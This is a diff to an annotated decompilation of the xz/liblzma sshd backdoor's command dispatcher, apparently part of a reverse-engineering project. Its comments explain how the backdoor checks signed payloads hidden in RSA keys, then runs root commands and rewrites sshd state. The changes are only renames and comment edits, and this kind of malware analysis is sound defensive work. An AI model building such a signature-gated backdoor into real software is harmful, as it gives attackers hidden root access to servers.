@@ -7,6 +7,7 @@
 /*
  * AutoDoc: Command dispatcher invoked by every RSA hook. It refuses to run unless the loader finished initialising, the secret-data bitmap hit 0x1c8 bits, and a valid modulus/exponent pair is available. The modulus bytes are copied out of RSA_get0_key, decrypted with ChaCha keys unwrapped via secret_data_get_decrypted, and spliced with the current host-key digest before iterating sshd host keys until verify_signature accepts the Ed448 signature. The decoded cmd_arguments_t drives opcode-specific actions: opcode 0 updates sshd_offsets/logging/PAM bits and selects sockets, opcode 1 rewrites sshd variables or reseeds RSA_set0_key, opcode 2 runs setresuid/setresgid/system commands, and opcode 3 packages monitor_data_t payloads for sshd_proxy_elevate (including continuation chunks streamed into ctx->payload_buffer). Any parse/signature/socket failure flips disable_backdoor (and may call libc exit when requested) before forcing the RSA hook to defer to the original OpenSSL routine.
  */
+
 #include "xzre_types.h"
 
 BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
@@ -50,7 +51,6 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   u8 **scratch_ptr;
   uint *header_copy_cursor;
   byte log_hook_flags;
-  sshd_hostkey_index_t selected_hostkey_idx;
   long hostkey_cursor;
   ulong rsa_payload_bytes;
   ulong payload_data_offset;
@@ -68,7 +68,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
   u8 *signature;
   sshd_offsets_t offsets;
   int rsa_modulus_bits;
-  sshd_offsets_t tmp;
+  sshd_hostkey_index_t selected_hostkey_idx;
   int socket_probe_header;
   u32 socket_probe_highword;
   u8 *extra_data;
@@ -241,9 +241,9 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                     if (operation_ok != FALSE) {
                       hostkey_cursor = 0;
                       do {
-                        offsets.field0_0x0 = SUB84(payload_buffer_cursor,0);
+                        offsets.raw_value = (u32)payload_buffer_cursor;
                         selected_hostkey_idx.raw_value = (u32)hostkey_cursor;
-                        if ((uint)offsets.field0_0x0 <= selected_hostkey_idx.raw_value) goto LAB_0010a112;
+                        if (offsets.raw_value <= selected_hostkey_idx.raw_value) goto LAB_0010a112;
                         // AutoDoc: Iterate every cached host key until the Ed448 signature over the modulus+ciphertext digest validates.
                         operation_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[hostkey_cursor],
                                                   cmd_args_scratch,_data_offset + 4,0x25c,(u8 *)&data_s2,
@@ -311,8 +311,8 @@ LAB_00109c56:
 LAB_00109c7b:
                                   rsa_payload_span = rsa_payload_span | socket_slot_field << 0x18;
 LAB_00109c8a:
-                                  // AutoDoc: The bit packing above rewrites sshd_offsets (log slot, monitor opcode override, socket ordinal) directly from the attacker’s flag bytes.
-                                  (ctx->sshd_offsets).field0_0x0.raw_value = rsa_payload_span;
+                                  // AutoDoc: Opcode 0 repacks attacker-supplied bits into `ctx->sshd_offsets` so sshd_get_sshbuf/sshbuf_extract can locate the kex sshbuf pointer slot, the monitor pkex_table slot, and the sshbuf data/size fields across builds.
+                                  (ctx->sshd_offsets).raw_value = rsa_payload_span;
                                   command_payload_ptr = (uid_t *)(encrypted_payload_bytes + payload_data_offset + 5);
                                   // AutoDoc: Opcode 1/2/3 sides only run when the hook already executes as root; unprivileged callers are forced through the harmless offsets rewrite.
                                   if (caller_uid == 0) {
